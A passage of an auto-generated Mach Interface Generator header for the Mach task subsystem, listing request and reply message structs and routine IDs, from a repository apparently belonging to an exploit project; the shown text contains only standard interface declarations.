	__Request__task_assign_default_t Request_task_assign_default;
	__Request__task_get_assignment_t Request_task_get_assignment;
	__Request__task_set_policy_t Request_task_set_policy;
	__Request__task_get_state_t Request_task_get_state;
	__Request__task_set_state_t Request_task_set_state;
	__Request__task_set_phys_footprint_limit_t Request_task_set_phys_footprint_limit;
	__Request__task_suspend2_t Request_task_suspend2;
	__Request__task_resume2_t Request_task_resume2;
	__Request__task_purgable_info_t Request_task_purgable_info;
	__Request__task_get_mach_voucher_t Request_task_get_mach_voucher;
	__Request__task_set_mach_voucher_t Request_task_set_mach_voucher;
	__Request__task_swap_mach_voucher_t Request_task_swap_mach_voucher;
	__Request__task_generate_corpse_t Request_task_generate_corpse;
	__Request__task_map_corpse_info_t Request_task_map_corpse_info;
	__Request__task_register_dyld_image_infos_t Request_task_register_dyld_image_infos;
	__Request__task_unregister_dyld_image_infos_t Request_task_unregister_dyld_image_infos;
	__Request__task_get_dyld_image_infos_t Request_task_get_dyld_image_infos;
	__Request__task_register_dyld_shared_cache_image_info_t Request_task_register_dyld_shared_cache_image_info;
	__Request__task_register_dyld_set_dyld_state_t Request_task_register_dyld_set_dyld_state;
	__Request__task_register_dyld_get_process_state_t Request_task_register_dyld_get_process_state;
	__Request__task_map_corpse_info_64_t Request_task_map_corpse_info_64;
	__Request__task_inspect_t Request_task_inspect;
	__Request__task_get_exc_guard_behavior_t Request_task_get_exc_guard_behavior;
	__Request__task_set_exc_guard_behavior_t Request_task_set_exc_guard_behavior;
	__Request__task_dyld_process_info_notify_register_t Request_task_dyld_process_info_notify_register;
	__Request__task_create_identity_token_t Request_task_create_identity_token;
	__Request__task_identity_token_get_task_port_t Request_task_identity_token_get_task_port;
	__Request__task_dyld_process_info_notify_deregister_t Request_task_dyld_process_info_notify_deregister;
	__Request__task_get_exception_ports_info_t Request_task_get_exception_ports_info;
	__Request__task_test_sync_upcall_t Request_task_test_sync_upcall;
	__Request__task_set_corpse_forking_behavior_t Request_task_set_corpse_forking_behavior;
	__Request__task_test_async_upcall_propagation_t Request_task_test_async_upcall_propagation;
	__Request__task_map_kcdata_object_64_t Request_task_map_kcdata_object_64;
};
#endif /* !__RequestUnion__task_subsystem__defined */
/* typedefs for all replies */

#ifndef __Reply__task_subsystem__defined
#define __Reply__task_subsystem__defined

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_task;
		/* end of the kernel processed data */
	} __Reply__task_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_terminate_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t act_list;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t act_listCnt;
	} __Reply__task_threads_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__mach_ports_register_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t init_port_set;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t init_port_setCnt;
	} __Reply__mach_ports_lookup_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t task_info_outCnt;
		integer_t task_info_out[90];
	} __Reply__task_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_suspend_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_resume_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
	} __Reply__task_get_special_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_special_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_act;
		/* end of the kernel processed data */
	} __Reply__thread_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_act;
		/* end of the kernel processed data */
	} __Reply__thread_create_running_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply__task_get_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply__task_swap_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_lock_set;
		/* end of the kernel processed data */
	} __Reply__lock_set_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__lock_set_destroy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t semaphore;
		/* end of the kernel processed data */
	} __Reply__semaphore_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__semaphore_destroy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_policy_set_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
		boolean_t get_default;
	} __Reply__task_policy_get_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_sample_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_policy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_emulation_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t emulation_vector;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int vector_start;
		mach_msg_type_number_t emulation_vectorCnt;
	} __Reply__task_get_emulation_vector_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_emulation_vector_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_ras_pc_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
	} __Reply__task_zone_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_assign_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_assign_default_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t assigned_set;
		/* end of the kernel processed data */
	} __Reply__task_get_assignment_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_policy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
	} __Reply__task_get_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		int old_limit;
	} __Reply__task_set_phys_footprint_limit_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t suspend_token;
		/* end of the kernel processed data */
	} __Reply__task_suspend2_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_resume2_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		task_purgable_info_t stats;
	} __Reply__task_purgable_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} __Reply__task_get_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
	} __Reply__task_swap_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t corpse_task_port;
		/* end of the kernel processed data */
	} __Reply__task_generate_corpse_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		vm_address_t kcd_addr_begin;
		uint32_t kcd_size;
	} __Reply__task_map_corpse_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_register_dyld_image_infos_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_unregister_dyld_image_infos_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t dyld_images;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t dyld_imagesCnt;
	} __Reply__task_get_dyld_image_infos_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_register_dyld_shared_cache_image_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_register_dyld_set_dyld_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		dyld_kernel_process_info_t dyld_process_state;
	} __Reply__task_register_dyld_get_process_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t kcd_addr_begin;
		mach_vm_size_t kcd_size;
	} __Reply__task_map_corpse_info_64_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t info_outCnt;
		integer_t info_out[4];
	} __Reply__task_inspect_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		task_exc_guard_behavior_t behavior;
	} __Reply__task_get_exc_guard_behavior_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_exc_guard_behavior_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_dyld_process_info_notify_register_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t token;
		/* end of the kernel processed data */
	} __Reply__task_create_identity_token_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t task_port;
		/* end of the kernel processed data */
	} __Reply__task_identity_token_get_task_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_dyld_process_info_notify_deregister_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_handler_info_t old_handlers_info[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply__task_get_exception_ports_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_test_sync_upcall_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_set_corpse_forking_behavior_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__task_test_async_upcall_propagation_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t kcd_addr_begin;
		mach_vm_size_t kcd_size;
	} __Reply__task_map_kcdata_object_64_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
#endif /* !__Reply__task_subsystem__defined */

/* union of all replies */

#ifndef __ReplyUnion__task_subsystem__defined
#define __ReplyUnion__task_subsystem__defined
union __ReplyUnion__task_subsystem {
	__Reply__task_create_t Reply_task_create;
	__Reply__task_terminate_t Reply_task_terminate;
	__Reply__task_threads_t Reply_task_threads;
	__Reply__mach_ports_register_t Reply_mach_ports_register;
	__Reply__mach_ports_lookup_t Reply_mach_ports_lookup;
	__Reply__task_info_t Reply_task_info;
	__Reply__task_set_info_t Reply_task_set_info;
	__Reply__task_suspend_t Reply_task_suspend;
	__Reply__task_resume_t Reply_task_resume;
	__Reply__task_get_special_port_t Reply_task_get_special_port;
	__Reply__task_set_special_port_t Reply_task_set_special_port;
	__Reply__thread_create_t Reply_thread_create;
	__Reply__thread_create_running_t Reply_thread_create_running;
	__Reply__task_set_exception_ports_t Reply_task_set_exception_ports;
	__Reply__task_get_exception_ports_t Reply_task_get_exception_ports;
	__Reply__task_swap_exception_ports_t Reply_task_swap_exception_ports;
	__Reply__lock_set_create_t Reply_lock_set_create;
	__Reply__lock_set_destroy_t Reply_lock_set_destroy;
	__Reply__semaphore_create_t Reply_semaphore_create;
	__Reply__semaphore_destroy_t Reply_semaphore_destroy;
	__Reply__task_policy_set_t Reply_task_policy_set;
	__Reply__task_policy_get_t Reply_task_policy_get;
	__Reply__task_sample_t Reply_task_sample;
	__Reply__task_policy_t Reply_task_policy;
	__Reply__task_set_emulation_t Reply_task_set_emulation;
	__Reply__task_get_emulation_vector_t Reply_task_get_emulation_vector;
	__Reply__task_set_emulation_vector_t Reply_task_set_emulation_vector;
	__Reply__task_set_ras_pc_t Reply_task_set_ras_pc;
	__Reply__task_zone_info_t Reply_task_zone_info;
	__Reply__task_assign_t Reply_task_assign;
	__Reply__task_assign_default_t Reply_task_assign_default;
	__Reply__task_get_assignment_t Reply_task_get_assignment;
	__Reply__task_set_policy_t Reply_task_set_policy;
	__Reply__task_get_state_t Reply_task_get_state;
	__Reply__task_set_state_t Reply_task_set_state;
	__Reply__task_set_phys_footprint_limit_t Reply_task_set_phys_footprint_limit;
	__Reply__task_suspend2_t Reply_task_suspend2;
	__Reply__task_resume2_t Reply_task_resume2;
	__Reply__task_purgable_info_t Reply_task_purgable_info;
	__Reply__task_get_mach_voucher_t Reply_task_get_mach_voucher;
	__Reply__task_set_mach_voucher_t Reply_task_set_mach_voucher;
	__Reply__task_swap_mach_voucher_t Reply_task_swap_mach_voucher;
	__Reply__task_generate_corpse_t Reply_task_generate_corpse;
	__Reply__task_map_corpse_info_t Reply_task_map_corpse_info;
	__Reply__task_register_dyld_image_infos_t Reply_task_register_dyld_image_infos;
	__Reply__task_unregister_dyld_image_infos_t Reply_task_unregister_dyld_image_infos;
	__Reply__task_get_dyld_image_infos_t Reply_task_get_dyld_image_infos;
	__Reply__task_register_dyld_shared_cache_image_info_t Reply_task_register_dyld_shared_cache_image_info;
	__Reply__task_register_dyld_set_dyld_state_t Reply_task_register_dyld_set_dyld_state;
	__Reply__task_register_dyld_get_process_state_t Reply_task_register_dyld_get_process_state;
	__Reply__task_map_corpse_info_64_t Reply_task_map_corpse_info_64;
	__Reply__task_inspect_t Reply_task_inspect;
	__Reply__task_get_exc_guard_behavior_t Reply_task_get_exc_guard_behavior;
	__Reply__task_set_exc_guard_behavior_t Reply_task_set_exc_guard_behavior;
	__Reply__task_dyld_process_info_notify_register_t Reply_task_dyld_process_info_notify_register;
	__Reply__task_create_identity_token_t Reply_task_create_identity_token;
	__Reply__task_identity_token_get_task_port_t Reply_task_identity_token_get_task_port;
	__Reply__task_dyld_process_info_notify_deregister_t Reply_task_dyld_process_info_notify_deregister;
	__Reply__task_get_exception_ports_info_t Reply_task_get_exception_ports_info;
	__Reply__task_test_sync_upcall_t Reply_task_test_sync_upcall;
	__Reply__task_set_corpse_forking_behavior_t Reply_task_set_corpse_forking_behavior;
	__Reply__task_test_async_upcall_propagation_t Reply_task_test_async_upcall_propagation;
	__Reply__task_map_kcdata_object_64_t Reply_task_map_kcdata_object_64;
};
#endif /* !__RequestUnion__task_subsystem__defined */

#ifndef subsystem_to_name_map_task
#define subsystem_to_name_map_task \
    { "task_create", 3400 },\
    { "task_terminate", 3401 },\
    { "task_threads", 3402 },\
    { "mach_ports_register", 3403 },\
    { "mach_ports_lookup", 3404 },\
    { "task_info", 3405 },\
    { "task_set_info", 3406 },\
    { "task_suspend", 3407 },\
    { "task_resume", 3408 },\
    { "task_get_special_port", 3409 },\
    { "task_set_special_port", 3410 },\
    { "thread_create", 3411 },\
    { "thread_create_running", 3412 },\
    { "task_set_exception_ports", 3413 },\
    { "task_get_exception_ports", 3414 },\
    { "task_swap_exception_ports", 3415 },\
    { "lock_set_create", 3416 },\
    { "lock_set_destroy", 3417 },\
    { "semaphore_create", 3418 },\
    { "semaphore_destroy", 3419 },\
    { "task_policy_set", 3420 },\
    { "task_policy_get", 3421 },\
    { "task_sample", 3422 },\
    { "task_policy", 3423 },\
    { "task_set_emulation", 3424 },\
    { "task_get_emulation_vector", 3425 },\
    { "task_set_emulation_vector", 3426 },\
    { "task_set_ras_pc", 3427 },\
    { "task_zone_info", 3428 },\
    { "task_assign", 3429 },\
    { "task_assign_default", 3430 },\
    { "task_get_assignment", 3431 },\
    { "task_set_policy", 3432 },\
    { "task_get_state", 3433 },\
    { "task_set_state", 3434 },\
    { "task_set_phys_footprint_limit", 3435 },\
    { "task_suspend2", 3436 },\
    { "task_resume2", 3437 },\
    { "task_purgable_info", 3438 },\
    { "task_get_mach_voucher", 3439 },\
    { "task_set_mach_voucher", 3440 },\
    { "task_swap_mach_voucher", 3441 },\
    { "task_generate_corpse", 3442 },\
    { "task_map_corpse_info", 3443 },\
    { "task_register_dyld_image_infos", 3444 },\
    { "task_unregister_dyld_image_infos", 3445 },\
    { "task_get_dyld_image_infos", 3446 },\
    { "task_register_dyld_shared_cache_image_info", 3447 },\
    { "task_register_dyld_set_dyld_state", 3448 },\
    { "task_register_dyld_get_process_state", 3449 },\
    { "task_map_corpse_info_64", 3450 },\
    { "task_inspect", 3451 },\
    { "task_get_exc_guard_behavior", 3452 },\
    { "task_set_exc_guard_behavior", 3453 },\
    { "task_dyld_process_info_notify_register", 3456 },\
    { "task_create_identity_token", 3457 },\
    { "task_identity_token_get_task_port", 3458 },\
    { "task_dyld_process_info_notify_deregister", 3459 },\
    { "task_get_exception_ports_info", 3460 },\
    { "task_test_sync_upcall", 3461 },\
    { "task_set_corpse_forking_behavior", 3462 },\
    { "task_test_async_upcall_propagation", 3463 },\
    { "task_map_kcdata_object_64", 3464 }
#endif

#ifdef __AfterMigUserHeader
__AfterMigUserHeader
#endif /* __AfterMigUserHeader */

#endif	 /* _task_user_ */

```

`Exploits/oobPCI/Sources/generated/thread.c`:

```c
/*
 * IDENTIFICATION:
 * stub generated by bootstrap_cmds-128
 * OPTIONS: 
 */
#define	__MIG_check__Reply__thread_act_subsystem__ 1

#include "thread.h"

/* TODO: #include <mach/mach.h> */
#ifdef __cplusplus
extern "C" {
